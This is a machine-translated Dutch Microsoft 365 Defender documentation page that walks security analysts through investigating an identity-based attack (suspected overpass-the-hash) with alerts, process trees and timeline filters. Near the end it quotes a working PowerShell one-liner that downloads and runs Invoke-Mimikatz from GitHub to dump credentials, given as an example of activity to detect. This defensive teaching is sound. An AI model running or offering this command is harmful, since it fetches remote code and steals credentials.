---
title: Voorbeeld van een op identiteit gebaseerde aanval
description: Stap door een voorbeeldanalyse van een op identiteit gebaseerde aanval.
keywords: incidenten, waarschuwingen, onderzoeken, correlatie, aanval, machines, apparaten, gebruikers, identiteiten, identiteit, postvak, e-mail, 365, microsoft, m365, incidentrespons, cyberaanvallen
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114680"
---
# <a name="example-of-an-identity-based-attack"></a>Voorbeeld van een op identiteit gebaseerde aanval

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Van toepassing op:**
- Microsoft 365 Defender

Microsoft Defender voor identiteit kan helpen bij het opsporen van kwaadaardige pogingen om identiteiten in uw organisatie te compromitteerden. Omdat Defender for Identity is geïntegreerd met Microsoft 365 Defender, kunnen beveiligingsanalisten inzicht hebben in bedreigingen die afkomstig zijn van Defender voor identiteit, zoals mogelijke pogingen tot het verhogen van netlogon-bevoegdheden.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>De aanval analyseren in Microsoft Defender voor identiteit

Microsoft 365 Met Defender kunnen analisten waarschuwingen filteren op detectiebron op **het tabblad Waarschuwingen** van de pagina incidenten. In het volgende voorbeeld wordt de detectiebron gefilterd op **Defender voor identiteit.** 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Voorbeeld van het filteren van de detectiebron voor Defender voor identiteit":::

Als u **de waarschuwing Verdachte overpass-the-hash-aanval** selecteert, gaat u naar een pagina in Microsoft Cloud App Security met meer gedetailleerde informatie. U kunt altijd meer informatie over een  waarschuwing [of](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) aanval vinden door Meer informatie over dit type waarschuwing te selecteren voor een beschrijving van de aanval en suggesties voor herstel.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Voorbeeld van een waarschuwing voor een vermoedelijke viaduct-the-hash-aanval"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Dezelfde aanval onderzoeken in Microsoft Defender voor Eindpunt

Een analist kan ook Defender voor Eindpunt gebruiken voor meer informatie over de activiteit op een eindpunt. Selecteer het incident in de wachtrij voor incidenten en selecteer vervolgens het **tabblad Waarschuwingen.** Hier kunnen ze ook de detectiebron identificeren. Een detectiebron met het label EDR staat voor Endpoint Detection and Response, wat Defender voor Eindpunt is. Hier selecteert de analist een waarschuwing die is gedetecteerd door EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Voorbeeld van een eindpuntdetectie en -antwoord in Defender voor eindpunt"::: 

Op de waarschuwingspagina worden diverse relevante informatie weergegeven, zoals de naam van het beïnvloede apparaat, de gebruikersnaam, de status van automatisch onderzoek en de waarschuwingsgegevens. Het waarschuwingsverhaal toont een visuele weergave van de processtructuur. De processtructuur is een hiërarchische weergave van bovenliggende en onderliggende processen die zijn gerelateerd aan de waarschuwing.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Voorbeeld van een waarschuwingsprocesstructuur in Defender voor Eindpunt"::: 

Elk proces kan worden uitgebreid om aanvullende details weer te geven. Details die een analist kan zien, zijn de werkelijke opdrachten die zijn ingevoerd als onderdeel van een schadelijk script, IP-adressen voor uitgaande verbindingen en andere nuttige informatie.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Voorbeeld van procesdetails in Defender voor Eindpunt":::
 
Door In **tijdlijn bekijken te** selecteren, kan een analist nog verder inzoomen om de exacte tijd van het compromis te bepalen. 

Microsoft Defender voor Eindpunt kan veel schadelijke bestanden en scripts detecteren. Vanwege veel legitieme toepassingen voor uitgaande verbindingen, PowerShell- en opdrachtregelactiviteit, wordt bepaalde activiteit echter beschouwd als goedaardig totdat er een schadelijk bestand of activiteit wordt gemaakt. Daarom helpt het gebruik van de tijdlijn analisten om de waarschuwing in context te plaatsen met de omringende activiteit om de oorspronkelijke bron of tijd van de aanval te bepalen die anders wordt verborgen door veelgebruikte bestandssysteem- en gebruikersactiviteit. 

Hiervoor begint een analist op het moment van de waarschuwingsdetectie (rood) en schuift u terug in de tijd om te bepalen wanneer de oorspronkelijke activiteit die heeft geleid tot de schadelijke activiteit daadwerkelijk is gestart. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Voorbeeld van beginnen op het moment van de detectie van waarschuwingen"::: 

Het is belangrijk om algemene activiteiten te begrijpen en te onderscheiden, zoals Windows Update-verbindingen, Windows Activeringsverkeer voor vertrouwde software, andere veelvoorkomende verbindingen met Microsoft-sites, internetactiviteiten van derden, Microsoft Endpoint Configuration Manager-activiteit en andere goedaardige activiteiten van verdachte activiteiten. U kunt dit onder andere doen door tijdlijnfilters te gebruiken. Er zijn veel filters die specifieke activiteiten kunnen markeren terwijl de analist alles uitfiltert dat de analist niet wil weergeven. 

In de onderstaande afbeelding heeft de analist gefilterd om alleen netwerk- en procesgebeurtenissen weer te geven. Hierdoor kan de analist de netwerkverbindingen en -processen zien rond de gebeurtenis waarbij Kladblok verbinding heeft gemaakt met een IP-adres, dat we ook in de processtructuur hebben gezien. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Voorbeeld van hoe Kladblok is gebruikt om een schadelijke uitgaande verbinding te maken"::: 

In dit specifieke geval is Kladblok gebruikt om een schadelijke uitgaande verbinding te maken. Vaak gebruiken aanvallers echter gewoon iexplorer.exe verbinding maken om een schadelijke payload te downloaden, omdat iexplorer.exe gewoonlijk als normale webbrowseractiviteit worden beschouwd.

Een ander item dat u in de tijdlijn moet zoeken, is PowerShell-toepassingen voor uitgaande verbindingen. De analist zou zoeken naar succesvolle PowerShell-verbindingen met opdrachten, zoals gevolgd door een uitgaande verbinding met een website die een schadelijk bestand `IEX (New-Object Net.Webclient)` host. 

In het volgende voorbeeld is PowerShell gebruikt om Mimikatz van een website te downloaden en uit te voeren:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Een analist kan snel naar trefwoorden zoeken door het trefwoord in de zoekbalk te typen om alleen gebeurtenissen weer te geven die zijn gemaakt met PowerShell. 

## <a name="next-step"></a>Volgende stap

Bekijk het [pad voor phishingonderzoek.](first-incident-path-phishing.md)

## <a name="see-also"></a>Zie ook

- [Overzicht van incidenten](incidents-overview.md)
- [Incidenten beheren](manage-incidents.md)
- [Incidenten analyseren](investigate-incidents.md)
